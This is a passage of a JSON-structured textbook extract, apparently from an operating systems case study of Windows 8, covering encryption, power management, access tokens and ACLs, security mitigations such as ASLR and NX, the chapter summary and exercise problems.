11\r\nnew files moved to them or created in them to be encrypted as well. The actual en\u0002cryption and decryption are not managed by NTFS itself, but by a driver called\r\nEFS (Encryption File System), which registers callbacks with NTFS.\r\nEFS provides encryption for specific files and directories. There is also anoth\u0002er encryption facility in Windows called BitLocker which encrypts almost all the\r\ndata on a volume, which can help protect data no matter what—as long as the user\r\ntakes advantage of the mechanisms available for strong keys. Given the number of\r\nsystems that are lost or stolen all the time, and the great sensitivity to the issue of\r\nidentity theft, making sure secrets are protected is very important. An amazing\r\nnumber of notebooks go missing every day. Major Wall Street companies sup\u0002posedly average losing one notebook per week in taxicabs in New York City alone."
          }
        }
      },
      "11.9 WINDOWS POWER MANAGEMENT": {
        "page": 995,
        "content": "11.9 WINDOWS POWER MANAGEMENT\r\nThe power manager rides herd on power usage throughout the system. His\u0002torically management of power consumption consisted of shutting off the monitor\r\ndisplay and stopping the disk drives from spinning. But the issue is rapidly becom\u0002ing more complicated due to requirements for extending how long notebooks can\r\nrun on batteries, and energy-conservation concerns related to desktop computers\r\nbeing left on all the time and the high cost of supplying power to the huge server\r\nfarms that exist today.\r\nNewer power-management facilities include reducing the power consumption\r\nof components when the system is not in use by switching individual devices to\r\nstandby states, or even powering them off completely using soft power switches.\r\nMultiprocessors shut down individual CPUs when they are not needed, and even\r\nthe clock rates of the running CPUs can be adjusted downward to reduce power\r\nconsumption. When a processor is idle, its power consumption is also reduced\r\nsince it needs to do nothing except wait for an interrupt to occur.\r\nWindows supports a special shut down mode called hibernation, which copies\r\nall of physical memory to disk and then reduces power consumption to a small\r\ntrickle (notebooks can run weeks in a hibernated state) with little battery drain.\r\nBecause all the memory state is written to disk, you can even replace the battery on\r\na notebook while it is hibernated. When the system resumes after hibernation it re\u0002stores the saved memory state (and reinitializes the I/O devices). This brings the\r\ncomputer back into the same state it was before hibernation, without having to\r\nlogin again and start up all the applications and services that were running. Win\u0002dows optimizes this process by ignoring unmodified pages backed by disk already\r\nand compressing other memory pages to reduce the amount of I/O bandwidth re\u0002quired. The hibernation algorithm automatically tunes itself to balance between\r\nI/O and processor throughput. If there is more processor available, it uses expen\u0002sive but more effective compression to reduce the I/O bandwidth needed. When\r\nI/O bandwidth is sufficient, hibernation will skip the compression altogether. With\nSEC. 11.9 WINDOWS POWER MANAGEMENT 965\r\nthe current generation of multiprocessors, both hibernation and resume can be per\u0002formed in a few seconds even on systems with many gigabytes of RAM.\r\nAn alternative to hibernation is standby mode where the power manager re\u0002duces the entire system to the lowest power state possible, using just enough power\r\nto the refresh the dynamic RAM. Because memory does not need to be copied to\r\ndisk, this is somewhat faster than hibernation on some systems.\r\nDespite the availability of hibernation and standby, many users are still in the\r\nhabit of shutting down their PC when they finish working. Windows uses hiberna\u0002tion to perform a pseudo shutdown and startup, called HiberBoot, that is much fast\u0002er than normal shutdown and startup. When the user tells the system to shutdown,\r\nHiberBoot logs the user off and then hibernates the system at the point they would\r\nnormally login again. Later, when the user turns the system on again, HiberBoot\r\nwill resume the system at the login point. To the user it looks like shutdown was\r\nvery, very fast because most of the system initialization steps are skipped. Of\r\ncourse, sometimes the system needs to perform a real shutdown in order to fix a\r\nproblem or install an update to the kernel. If the system is told to reboot rather\r\nthan shutdown, the system undergoes a real shutdown and performs a normal boot.\r\nOn phones and tablets, as well as the newest generation of laptops, computing\r\ndevices are expected to be always on yet consume little power. To provide this\r\nexperience Modern Windows implements a special version of power management\r\ncalled CS (connected standby). CS is possible on systems with special network\u0002ing hardware which is able to listen for traffic on a small set of connections using\r\nmuch less power than if the CPU were running. A CS system always appears to be\r\non, coming out of CS as soon as the screen is turned on by the user. Connected\r\nstandby is different than the regular standby mode because a CS system will also\r\ncome out of standby when it receives a packet on a monitored connection. Once\r\nthe battery begins to run low, a CS system will go into the hibernation state to\r\navoid completely exhausting the battery and perhaps losing user data.\r\nAchieving good battery life requires more than just turning off the processor as\r\noften as possible. It is also important to keep the processor off as long as possible.\r\nThe CS network hardware allows the processors to stay off until data have arrived,\r\nbut other events can also cause the processors to be turned back on. In NT-based\r\nWindows device drivers, system services, and the applications themselves fre\u0002quently run for no particular reason other than to check on things. Such polling\r\nactivity is usually based on setting timers to periodically run code in the system or\r\napplication. Timer-based polling can produce a cacophony of events turning on the\r\nprocessor. To avoid this, Modern Windows requires that timers specify an impreci\u0002sion parameter which allows the operating system to coalesce timer events and re\u0002duce the number of separate occasions one of the processors will have to be turned\r\nback on. Windows also formalizes the conditions under which an application that\r\nis not actively running can execute code in the background. Operations like check\u0002ing for updates or freshening content cannot be performed solely by requesting to\r\nrun when a timer expires. An application must defer to the operating system about\n966 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nwhen to run such background activities. For example, checking for updates might\r\noccur only once a day or at the next time the device is charging its battery. A set of\r\nsystem brokers provide a variety of conditions which can be used to limit when\r\nbackground activity is performed. If a background task needs to access a low-cost\r\nnetwork or utilize a user’s credentials, the brokers will not execute the task until\r\nthe requisite conditions are present.\r\nMany applications today are implemented with both local code and services in\r\nthe cloud. Windows provides WNS (Windows Notification Service) which allows\r\nthird-party services to push notifications to a Windows device in CS without re\u0002quiring the CS network hardware to specifically listen for packets from the third\r\nparty’s servers. WNS notifications can signal time-critical events, such as the arri\u0002val of a text message or a VoIP call. When a WNS packet arrives, the processor\r\nwill have to be turned on to process it, but the ability of the CS network hardware\r\nto discriminate between traffic from different connections means the processor\r\ndoes not have to awaken for every random packet that arrives at the network inter\u0002face."
      },
      "11.10 SECURITY IN WINDOWS 8": {
        "page": 997,
        "children": {
          "11.10.1 Fundamental Concepts": {
            "page": 998,
            "content": "11.10.1 Fundamental Concepts\r\nEvery Windows user (and group) is identified by an SID (Security ID). SIDs\r\nare binary numbers with a short header followed by a long random component.\r\nEach SID is intended to be unique worldwide. When a user starts up a process, the\r\nprocess and its threads run under the user’s SID. Most of the security system is de\u0002signed to make sure that each object can be accessed only by threads with autho\u0002rized SIDs.\r\nEach process has an access token that specifies an SID and other properties.\r\nThe token is normally created by winlogon, as described below. The format of the\r\ntoken is shown in Fig. 11-45. Processes can call GetTokenInfor mation to acquire\r\nthis information. The header contains some administrative information. The expi\u0002ration time field could tell when the token ceases to be valid, but it is currently not\r\nused. The Groups field specifies the groups to which the process belongs, which is\r\nneeded for the POSIX subsystem. The default DACL (Discretionary ACL) is the\n968 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\naccess control list assigned to objects created by the process if no other ACL is\r\nspecified. The user SID tells who owns the process. The restricted SIDs are to\r\nallow untrustworthy processes to take part in jobs with trustworthy processes but\r\nwith less power to do damage.\r\nFinally, the privileges listed, if any, giv e the process special powers denied or\u0002dinary users, such as the right to shut the machine down or access files to which\r\naccess would otherwise be denied. In effect, the privileges split up the power of\r\nthe superuser into several rights that can be assigned to processes individually. In\r\nthis way, a user can be given some superuser power, but not all of it. In summary,\r\nthe access token tells who owns the process and which defaults and powers are as\u0002sociated with it.\r\nHeader Expiration\r\nTime Groups Default\r\nCACL\r\nUser\r\nSID\r\nGroup\r\nSID\r\nRestricted\r\nSIDs Privileges Impersonation\r\nLevel\r\nIntegrity\r\nLevel\r\nFigure 11-45. Structure of an access token.\r\nWhen a user logs in, winlogon gives the initial process an access token. Subse\u0002quent processes normally inherit this token on down the line. A process’ access\r\ntoken initially applies to all the threads in the process. However, a thread can ac\u0002quire a different access token during execution, in which case the thread’s access\r\ntoken overrides the process’ access token. In particular, a client thread can pass its\r\naccess rights to a server thread to allow the server to access the client’s protected\r\nfiles and other objects. This mechanism is called impersonation. It is imple\u0002mented by the transport layers (i.e., ALPC, named pipes, and TCP/IP) and used by\r\nRPC to communicate from clients to servers. The transports use internal interfaces\r\nin the kernel’s security reference monitor component to extract the security context\r\nfor the current thread’s access token and ship it to the server side, where it is used\r\nto construct a token which can be used by the server to impersonate the client.\r\nAnother basic concept is the security descriptor. Every object has a security\r\ndescriptor associated with it that tells who can perform which operations on it.\r\nThe security descriptors are specified when the objects are created. The NTFS file\r\nsystem and the registry maintain a persistent form of security descriptor, which is\r\nused to create the security descriptor for File and Key objects (the object-manager\r\nobjects representing open instances of files and keys).\r\nA security descriptor consists of a header followed by a DACL with one or\r\nmore ACEs (Access Control Entries). The two main kinds of elements are Allow\r\nand Deny. An Allow element specifies an SID and a bitmap that specifies which\r\noperations processes that SID may perform on the object. A Deny element works\r\nthe same way, except a match means the caller may not perform the operation. For\r\nexample, Ida has a file whose security descriptor specifies that everyone has read\r\naccess, Elvis has no access. Cathy has read/write access, and Ida herself has full\nSEC. 11.10 SECURITY IN WINDOWS 8 969\r\naccess. This simple example is illustrated in Fig. 11-46. The SID Everyone refers\r\nto the set of all users, but it is overridden by any explicit ACEs that follow.\r\nSecurity\r\ndescriptor\r\nHeader\r\nOwner's SID\r\nGroup SID\r\nDACL\r\nSACL\r\nHeader\r\nAudit\r\nMarilyn\r\n111111\r\nSecurity\r\ndescriptor\r\nHeader\r\nAllow\r\nEveryone\r\nDeny\r\n Elvis\r\n111111\r\nAllow\r\nCathy\r\n110000\r\nAllow\r\n Ida\r\nACE\r\nACE\r\nFile\r\n100000\r\n111111\r\nFigure 11-46. An example security descriptor for a file.\r\nIn addition to the DACL, a security descriptor also has a SACL (System\r\nAccess Control list), which is like a DACL except that it specifies not who may\r\nuse the object, but which operations on the object are recorded in the systemwide\r\nsecurity event log. In Fig. 11-46, every operation that Marilyn performs on the file\r\nwill be logged. The SACL also contains the integrity level, which we will de\u0002scribe shortly."
          },
          "11.10.2 Security API Calls": {
            "page": 1000,
            "content": "11.10.2 Security API Calls\r\nMost of the Windows access-control mechanism is based on security descrip\u0002tors. The usual pattern is that when a process creates an object, it provides a secu\u0002rity descriptor as one of the parameters to the CreateProcess, CreateFile, or other\r\nobject-creation call. This security descriptor then becomes the security descriptor\r\nattached to the object, as we saw in Fig. 11-46. If no security descriptor is pro\u0002vided in the object-creation call, the default security in the caller’s access token\r\n(see Fig. 11-45) is used instead.\r\nMany of the Win32 API security calls relate to the management of security de\u0002scriptors, so we will focus on those here. The most important calls are listed in\r\nFig. 11-47. To create a security descriptor, storage for it is first allocated and then\n970 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\ninitialized using InitializeSecur ityDescr iptor. This call fills in the header. If the\r\nowner SID is not known, it can be looked up by name using LookupAccountSid. It\r\ncan then be inserted into the security descriptor. The same holds for the group\r\nSID, if any. Normally, these will be the caller’s own SID and one of the called’s\r\ngroups, but the system administrator can fill in any SIDs.\r\nWin32 API function Description\r\nInitializeSecur ityDescr iptor Prepare a new secur ity descr iptor for use\r\nLookupAccountSid Look up the SID for a given user name\r\nSetSecur ityDescr iptorOwner Enter the owner SID in the security descriptor\r\nSetSecur ityDescr iptorGroup Enter a group SID in the security descriptor\r\nInitializeAcl Initialize a DACL or SACL\r\nAddAccessAllowedAce Add a new ACE to a DACL or SACL allowing access\r\nAddAccessDeniedAce Add a new ACE to a DACL or SACL denying access\r\nDeleteAce Remove an ACE from a DACL or SACL\r\nSetSecur ityDescr iptorDacl Attach a DACL to a secur ity descr iptor\r\nFigure 11-47. The principal Win32 API functions for security.\r\nAt this point the security descriptor’s DACL (or SACL) can be initialized with\r\nInitializeAcl. ACL entries can be added using AddAccessAllowedAce and AddAc\u0002cessDeniedAce. These calls can be repeated multiple times to add as many ACE\r\nentries as are needed. DeleteAce can be used to remove an entry, that is, when\r\nmodifying an existing ACL rather than when constructing a new ACL. When the\r\nACL is ready, SetSecur ityDescr iptorDacl can be used to attach it to the security de\u0002scriptor. Finally, when the object is created, the newly minted security descriptor\r\ncan be passed as a parameter to have it attached to the object."
          },
          "11.10.3 Implementation of Security": {
            "page": 1001,
            "content": "11.10.3 Implementation of Security\r\nSecurity in a stand-alone Windows system is implemented by a number of\r\ncomponents, most of which we have already seen (networking is a whole other\r\nstory and beyond the scope of this book). Logging in is handled by winlogon and\r\nauthentication is handled by lsass. The result of a successful login is a new GUI\r\nshell (explorer.exe) with its associated access token. This process uses the SECU\u0002RITY and SAM hives in the registry. The former sets the general security policy\r\nand the latter contains the security information for the individual users, as dis\u0002cussed in Sec. 11.2.3.\r\nOnce a user is logged in, security operations happen when an object is opened\r\nfor access. Every OpenXXX call requires the name of the object being opened and\r\nthe set of rights needed. During processing of the open, the security reference\r\nmonitor (see Fig. 11-11) checks to see if the caller has all the rights required. It\nSEC. 11.10 SECURITY IN WINDOWS 8 971\r\nperforms this check by looking at the caller’s access token and the DACL associ\u0002ated with the object. It goes down the list of ACEs in the ACL in order. As soon\r\nas it finds an entry that matches the caller’s SID or one of the caller’s groups, the\r\naccess found there is taken as definitive. If all the rights the caller needs are avail\u0002able, the open succeeds; otherwise it fails.\r\nDACLs can have Deny entries as well as Allow entries, as we have seen. For\r\nthis reason, it is usual to put entries denying access in front of entries granting ac\u0002cess in the ACL, so that a user who is specifically denied access cannot get in via a\r\nback door by being a member of a group that has legitimate access.\r\nAfter an object has been opened, a handle to it is returned to the caller. On\r\nsubsequent calls, the only check that is made is whether the operation now being\r\ntried was in the set of operations requested at open time, to prevent a caller from\r\nopening a file for reading and then trying to write on it. Additionally, calls on\r\nhandles may result in entries in the audit logs, as required by the SACL.\r\nWindows added another security facility to deal with common problems secur\u0002ing the system by ACLs. There are new mandatory integrity-level SIDs in the\r\nprocess token, and objects specify an integrity-level ACE in the SACL. The integ\u0002rity level prevents write-access to objects no matter what ACEs are in the DACL.\r\nIn particular, the integrity-level scheme is used to protect against an Internet Ex\u0002plorer process that has been compromised by an attacker (perhaps by the user ill\u0002advisedly downloading code from an unknown Website). Low-rights IE, as it is\r\ncalled, runs with an integrity level set to low. By default all files and registry keys\r\nin the system have an integrity level of medium, so IE running with low-integrity\r\nlevel cannot modify them.\r\nA number of other security features have been added to Windows in recent\r\nyears. Starting with service pack 2 of Windows XP, much of the system was com\u0002piled with a flag (/GS) that did validation against many kinds of stack buffer over\u0002flows. Additionally a facility in the AMD64 architecture, called NX, was used to\r\nlimit execution of code on stacks. The NX bit in the processor is available even\r\nwhen running in x86 mode. NX stands for no execute and allows pages to be\r\nmarked so that code cannot be executed from them. Thus, if an attacker uses a\r\nbuffer-overflow vulnerability to insert code into a process, it is not so easy to jump\r\nto the code and start executing it.\r\nWindows Vista introduced even more security features to foil attackers. Code\r\nloaded into kernel mode is checked (by default on x64 systems) and only loaded if\r\nit is properly signed by a known and trusted authority. The addresses that DLLs\r\nand EXEs are loaded at, as well as stack allocations, are shuffled quite a bit on\r\neach system to make it less likely that an attacker can successfully use buffer over\u0002flows to branch into a well-known address and begin executing sequences of code\r\nthat can be weaved into an elevation of privilege. A much smaller fraction of sys\u0002tems will be able to be attacked by relying on binaries being at standard addresses.\r\nSystems are far more likely to just crash, converting a potential elevation attack\r\ninto a less dangerous denial-of-service attack.\n972 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nYet another change was the introduction of what Microsoft calls UA C (User\r\nAccount Control). This is to address the chronic problem in Windows where\r\nmost users run as administrators. The design of Windows does not require users to\r\nrun as administrators, but neglect over many releases had made it just about impos\u0002sible to use Windows successfully if you were not an administrator. Being an\r\nadministrator all the time is dangerous. Not only can user errors easily damage the\r\nsystem, but if the user is somehow fooled or attacked and runs code that is trying to\r\ncompromise the system, the code will have administrative access, and can bury it\u0002self deep in the system.\r\nWith UAC, if an attempt is made to perform an operation requiring administra\u0002tor access, the system overlays a special desktop and takes control so that only\r\ninput from the user can authorize the access (similarly to how CTRL-ALT-DEL\r\nworks for C2 security). Of course, without becoming administrator it is possible\r\nfor an attacker to destroy what the user really cares about, namely his personal\r\nfiles. But UAC does help foil existing types of attacks, and it is always easier to\r\nrecover a compromised system if the attacker was unable to modify any of the sys\u0002tem data or files.\r\nThe final security feature in Windows is one we have already mentioned.\r\nThere is support to create protected processes which provide a security boundary.\r\nNormally, the user (as represented by a token object) defines the privilege bound\u0002ary in the system. When a process is created, the user has access to process\r\nthrough any number of kernel facilities for process creation, debugging, path\r\nnames, thread injection, and so on. Protected processes are shut off from user ac\u0002cess. The original use of this facility in Windows was to allow digital rights man\u0002agement software to better protect content. In Windows 8.1, protected processes\r\nwere expanded to more user-friendly purposes, like securing the system against at\u0002tackers rather than securing content against attacks by the system owner.\r\nMicrosoft’s efforts to improve the security of Windows have accelerated in\r\nrecent years as more and more attacks have been launched against systems around\r\nthe world. Some of these attacks have been very successful, taking entire countries\r\nand major corporations offline, and incurring costs of billions of dollars. Most of\r\nthe attacks exploit small coding errors that lead to buffer overruns or using memory\r\nafter it is freed, allowing the attacker to insert code by overwriting return ad\u0002dresses, exception pointers, virtual function pointers, and other data that control the\r\nexecution of programs. Many of these problems could be avoided if type-safe lan\u0002guages were used instead of C and C++. And even with these unsafe languages\r\nmany vulnerabilities could be avoided if students were better trained to understand\r\nthe pitfalls of parameter and data validation, and the many dangers inherent in\r\nmemory allocation APIs. After all, many of the software engineers who write code\r\nat Microsoft today were students a few years earlier, just as many of you reading\r\nthis case study are now. Many books are available on the kinds of small coding er\u0002rors that are exploitable in pointer-based languages and how to avoid them (e.g.,\r\nHoward and LeBlank, 2009).\nSEC. 11.10 SECURITY IN WINDOWS 8 973"
          },
          "11.10.4 Security Mitigations": {
            "page": 1004,
            "content": "11.10.4 Security Mitigations\r\nIt would be great for users if computer software did not have any bugs, particu\u0002larly bugs that are exploitable by hackers to take control of their computer and\r\nsteal their information, or use their computer for illegal purposes such as distrib\u0002uted denial-of-service attacks, compromising other computers, and distribution of\r\nspam or other illicit materials. Unfortunately, this is not yet feasible in practice,\r\nand computers continue to have security vulnerabilities. Operating system devel\u0002opers have expended incredible efforts to minimize the number of bugs, with\r\nenough success that attackers are increasing their focus on application software, or\r\nbrowser plug-ins, like Adobe Flash, rather than the operating system itself.\r\nComputer systems can still be made more secure through mitigation techni\u0002ques that make it more difficult to exploit vulnerabilities when they are found.\r\nWindows has continually added improvements to its mitigation techniques in the\r\nten years leading up to Windows 8.1.\r\nMitigation Description\r\n/GS compiler flag Add canary to stack frames to protect branch targets\r\nException hardening Restr ict what code can be invoked as exception handlers\r\nNX MMU protection Mar k code as non-executable to hinder attack payloads\r\nASLR Randomize address space to make ROP attacks difficult\r\nHeap hardening Check for common heap usage errors\r\nVTGuard Add checks to validate virtual function tables\r\nCode Integrity Ver ify that librar ies and drivers are properly cryptographically signed\r\nPatchguard Detect attempts to modify ker nel data, e.g. by rootkits\r\nWindows Update Provide regular security patches to remove vulnerabilities\r\nWindows Defender Built-in basic antivirus capability\r\nFigure 11-48. Some of the principal security mitigations in Windows.\r\nThe mitigations listed undermine different steps required for successful wide\u0002spread exploitation of Windows systems. Some provide defense-in-depth against\r\nattacks that are able to work around other mitigations. /GS protects against stack\r\noverflow attacks that might allow attackers to modify return addresses, function\r\npointers, and exception handlers. Exception hardening adds additional checks to\r\nverify that exception handler address chains are not overwritten. No-eXecute pro\u0002tection requires that successful attackers point the program counter not just at a\r\ndata payload, but at code that the system has marked as executable. Often at\u0002tackers attempt to circumvent NX protections using return-oriented-program\u0002ming or return to libC techniques that point the program counter at fragments of\r\ncode that allow them to build up an attack. ASLR (Address Space Layout Ran\u0002domization) foils such attacks by making it difficult for an attacker to know ahead\r\nof time just exactly where the code, stacks, and other data structures are loaded in\n974 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nthe address space. Recent work shows how running programs can be rerandom\u0002ized every few seconds, making attacks even more difficult (Giuffrida et al., 2012).\r\nHeap hardening is a series of mitigations added to the Windows imple\u0002mentation of the heap that make it more difficult to exploit vulnerabilities such as\r\nwriting beyond the boundaries of a heap allocation, or some cases of continuing to\r\nuse a heap block after freeing it. VTGuard adds additional checks in particularly\r\nsensitive code that prevent exploitation of use-after-free vulnerabilities related to\r\nvirtual-function tables in C++.\r\nCode integrity is kernel-level protection against loading arbitrary executable\r\ncode into processes. It checks that programs and libraries were cryptographically\r\nsigned by a trustworthy publisher. These checks work with the memory manager\r\nto verify the code on a page-by-page basis whenever individual pages are retrieved\r\nfrom disk. Patchguard is a kernel-level mitigation that attempts to detect rootkits\r\ndesigned to hide a successful exploitation from detection.\r\nWindows Update is an automated service providing fixes to security vulnera\u0002bilities by patching the affected programs and libraries within Windows. Many of\r\nthe vulnerabilities fixed were reported by security researchers, and their contribu\u0002tions are acknowledged in the notes attached to each fix. Ironically the security\r\nupdates themselves pose a significant risk. Almost all vulnerabilities used by at\u0002tackers are exploited only after a fix has been published by Microsoft. This is be\u0002cause reverse engineering the fixes themselves is the primary way most hackers\r\ndiscover vulnerabilities in systems. Systems that did not have all known updates\r\nimmediately applied are thus susceptible to attack. The security research commun\u0002ity is usually insistent that companies patch all vulnerabilities found within a rea\u0002sonable time. The current monthly patch frequency used by Microsoft is a com\u0002promise between keeping the community happy and how often users must deal\r\nwith patching to keep their systems safe.\r\nThe exception to this are the so-called zero day vulnerabilities. These are\r\nexploitable bugs that are not known to exist until after their use is detected. Fortu\u0002nately, zero day vulnerabilities are considered to be rare, and reliably exploitable\r\nzero days are even rarer due to the effectiveness of the mitigation measures de\u0002scribed above. There is a black market in such vulnerabilities. The mitigations in\r\nthe most recent versions of Windows are believed to be causing the market price\r\nfor a useful zero day to rise very steeply.\r\nFinally, antivirus software has become such a critical tool for combating mal\u0002ware that Windows includes a basic version within Windows, called Windows\r\nDefender. Antivirus software hooks into kernel operations to detect malware in\u0002side files, as well as recognize the behavioral patterns that are used by specific\r\ninstances (or general categories) of malware. These behaviors include the techni\u0002ques used to survive reboots, modify the registry to alter system behavior, and\r\nlaunching particular processes and services needed to implement an attack.\r\nThough Windows Defender provides reasonably good protection against common\r\nmalware, many users prefer to purchase third-party antivirus software.\nSEC. 11.10 SECURITY IN WINDOWS 8 975\r\nMany of these mitigations are under the control of compiler and linker flags.\r\nIf applications, kernel device drivers, or plug-in libraries read data into executable\r\nmemory or include code without /GS and ASLR enabled, the mitigations are not\r\npresent and any vulnerabilities in the programs are much easier to exploit. Fortu\u0002nately, in recent years the risks of not enabling mitigations are becoming widely\r\nunderstood by software developers, and mitigations are generally enabled.\r\nThe final two mitigations on the list are under the control of the user or admin\u0002istrator of each computer system. Allowing Windows Update to patch software\r\nand making sure that updated antivirus software is installed on systems are the best\r\ntechniques for protecting systems from exploitation. The versions of Windows\r\nused by enterprise customers include features that make it easier for administrators\r\nto ensure that the systems connected to their networks are fully patched and cor\u0002rectly configured with antivirus software."
          }
        }
      },
      "11.11 SUMMARY": {
        "page": 1006,
        "content": "11.11 SUMMARY\r\nKernel mode in Windows is structured in the HAL, the kernel and executive\r\nlayers of NTOS, and a large number of device drivers implementing everything\r\nfrom device services to file systems and networking to graphics. The HAL hides\r\ncertain differences in hardware from the other components. The kernel layer man\u0002ages the CPUs to support multithreading and synchronization, and the executive\r\nimplements most kernel-mode services.\r\nThe executive is based on kernel-mode objects that represent the key executive\r\ndata structures, including processes, threads, memory sections, drivers, devices,\r\nand synchronization objects—to mention a few. User processes create objects by\r\ncalling system services and get back handle references which can be used in subse\u0002quent system calls to the executive components. The operating system also creates\r\nobjects internally. The object manager maintains a namespace into which objects\r\ncan be inserted for subsequent lookup.\r\nThe most important objects in Windows are processes, threads, and sections.\r\nProcesses have virtual address spaces and are containers for resources. Threads are\r\nthe unit of execution and are scheduled by the kernel layer using a priority algo\u0002rithm in which the highest-priority ready thread always runs, preempting lower-pri\u0002ority threads as necessary. Sections represent memory objects, like files, that can\r\nbe mapped into the address spaces of processes. EXE and DLL program images\r\nare represented as sections, as is shared memory.\r\nWindows supports demand-paged virtual memory. The paging algorithm is\r\nbased on the working-set concept. The system maintains several types of page\r\nlists, to optimize the use of memory. The various page lists are fed by trimming\r\nthe working sets using complex formulas that try to reuse physical pages that have\r\nnot been referenced in a long time. The cache manager manages virtual addresses\r\nin the kernel that can be used to map files into memory, dramatically improving\n976 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nI/O performance for many applications because read operations can be satisfied\r\nwithout accessing the disk.\r\nI/O is performed by device drivers, which follow the Windows Driver Model.\r\nEach driver starts out by initializing a driver object that contains the addresses of\r\nthe procedures that the system can call to manipulate devices. The actual devices\r\nare represented by device objects, which are created from the configuration de\u0002scription of the system or by the plug-and-play manager as it discovers devices\r\nwhen enumerating the system buses. Devices are stacked and I/O request packets\r\nare passed down the stack and serviced by the drivers for each device in the device\r\nstack. I/O is inherently asynchronous, and drivers commonly queue requests for\r\nfurther work and return back to their caller. File-system volumes are implemented\r\nas devices in the I/O system.\r\nThe NTFS file system is based on a master file table, which has one record per\r\nfile or directory. All the metadata in an NTFS file system is itself part of an NTFS\r\nfile. Each file has multiple attributes, which can be either in the MFT record or\r\nnonresident (stored in blocks outside the MFT). NTFS supports Unicode, com\u0002pression, journaling, and encryption among many other features.\r\nFinally, Windows has a sophisticated security system based on access control\r\nlists and integrity levels. Each process has an authentication token that tells the\r\nidentity of the user and what special privileges the process has, if any. Each object\r\nhas a security descriptor associated with it. The security descriptor points to a dis\u0002cretionary access control list that contains access control entries that can allow or\r\ndeny access to individuals or groups. Windows has added numerous security fea\u0002tures in recent releases, including BitLocker for encrypting entire volumes, and ad\u0002dress-space randomization, nonexecutable stacks, and other measures to make suc\u0002cessful attacks more difficult.\r\nPROBLEMS\r\n1. Give one advantage and one disadvantage of the registry vs. having individual .ini files.\r\n2. A mouse can have one, two, or three buttons. All three types are in use. Does the HAL\r\nhide this difference from the rest of the operating system? Why or why not?\r\n3. The HAL keeps track of time starting in the year 1601. Give an example of an applica\u0002tion where this feature is useful.\r\n4. In Sec. 11.3.3 we described the problems caused by multithreaded applications closing\r\nhandles in one thread while still using them in another. One possibility for fixing this\r\nwould be to insert a sequence field. How could this help? What changes to the system\r\nwould be required?\r\n5. Many components of the executive (Fig. 11-11) call other components of the executive.\r\nGive three examples of one component calling another one, but use (six) different com\u0002ponents in all.\nCHAP. 11 PROBLEMS 977\r\n6. Win32 does not have signals. If they were to be introduced, they could be per process,\r\nper thread, both, or neither. Make a proposal and explain why it is a good idea.\r\n7. An alternative to using DLLs is to statically link each program with precisely those li\u0002brary procedures it actually calls, no more and no less. If this scheme were to be intro\u0002duced, would it make more sense on client machines or on server machines?\r\n8. The discussion of Windows User-Mode Scheduling mentioned that user-mode and ker\u0002nel-mode threads had different stacks. What are some reasons why separate stacks are\r\nneeded?\r\n9. Windows uses 2-MB large pages because it improves the effectiveness of the TLB,\r\nwhich can have a profound impact on performance. Why is this? Why are 2-MB large\r\npages not used all the time?\r\n10. Is there any limit on the number of different operations that can be defined on an exec\u0002utive object? If so, where does this limit come from? If not, why not?\r\n11. The Win32 API call WaitForMultipleObjects allows a thread to block on a set of syn\u0002chronization objects whose handles are passed as parameters. As soon as any one of\r\nthem is signaled, the calling thread is released. Is it possible to have the set of syn\u0002chronization objects include two semaphores, one mutex, and one critical section?\r\nWhy or why not? (Hint: This is not a trick question but it does require some careful\r\nthought.)\r\n12. When initializing a global variable in a multithreaded program, a common pro\u0002gramming error is to allow a race condition where the variable can be initialized twice.\r\nWhy could this be a problem? Windows provides the InitOnceExecuteOnce API to\r\nprevent such races. How might it be implemented?\r\n13. Name three reasons why a desktop process might be terminated. What additional rea\u0002son might cause a process running a modern application to be terminated?\r\n14. Modern applications must save their state to disk every time the user switches away\r\nfrom the application. This seems inefficient, as users may switch back to an applica\u0002tion many times and the application simply resumes running. Why does the operating\r\nsystem require applications to save their state so often rather than just giving them a\r\nchance at the point the application is actually going to be terminated?\r\n15. As described in Sec. 11.4, there is a special handle table used to allocate IDs for proc\u0002esses and threads. The algorithms for handle tables normally allocate the first avail\u0002able handle (maintaining the free list in LIFO order). In recent releases of Windows\r\nthis was changed so that the ID table always keeps the free list in FIFO order. What is\r\nthe problem that the LIFO ordering potentially causes for allocating process IDs, and\r\nwhy does not UNIX have this problem?\r\n16. Suppose that the quantum is set to 20 msec and the current thread, at priority 24, has\r\njust started a quantum. Suddenly an I/O operation completes and a priority 28 thread\r\nis made ready. About how long does it have to wait to get to run on the CPU?\r\n17. In Windows, the current priority is always greater than or equal to the base priority.\r\nAre there any circumstances in which it would make sense to have the current priority\r\nbe lower than the base priority? If so, give an example. If not, why not?\n978 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\n18. Windows uses a facility called Autoboost to temporarily raise the priority of a thread\r\nthat holds the resource that is required by a higher-priority thread. How do you think\r\nthis works?\r\n19. In Windows it is easy to implement a facility where threads running in the kernel can\r\ntemporarily attach to the address space of a different process. Why is this so much\r\nharder to implement in user mode? Why might it be interesting to do so?\r\n20. Name two ways to give better response time to the threads in important processes.\r\n21. Even when there is plenty of free memory available, and the memory manager does not\r\nneed to trim working sets, the paging system can still frequently be writing to disk.\r\nWhy?\r\n22. Windows swaps the processes for modern applications rather than reducing their work\u0002ing set and paging them. Why would this be more efficient? (Hint: It makes much less\r\nof a difference when the disk is an SSD.)\r\n23. Why does the self-map used to access the physical pages of the page directory and\r\npage tables for a process always occupy the same 8 MB of kernel virtual addresses (on\r\nthe x86)?\r\n24. The x86 can use either 64-bit or 32-bit page table entries. Windows uses 64-bit PTEs\r\nso the system can access more than 4 GB of memory. With 32-bit PTEs, the self-map\r\nuses only one PDE in the page directory, and thus occupies only 4 MB of addresses\r\nrather than 8 MB. Why is this?\r\n25. If a region of virtual address space is reserved but not committed, do you think a VAD\r\nis created for it? Defend your answer.\r\n26. Which of the transitions shown in Fig. 11-34 are policy decisions, as opposed to re\u0002quired moves forced by system events (e.g., a process exiting and freeing its pages)?\r\n27. Suppose that a page is shared and in two working sets at once. If it is evicted from one\r\nof the working sets, where does it go in Fig. 11-34? What happens when it is evicted\r\nfrom the second working set?\r\n28. When a process unmaps a clean stack page, it makes the transition (5) in Fig. 11-34.\r\nWhere does a dirty stack page go when unmapped? Why is there no transition to the\r\nmodified list when a dirty stack page is unmapped?\r\n29. Suppose that a dispatcher object representing some type of exclusive lock (like 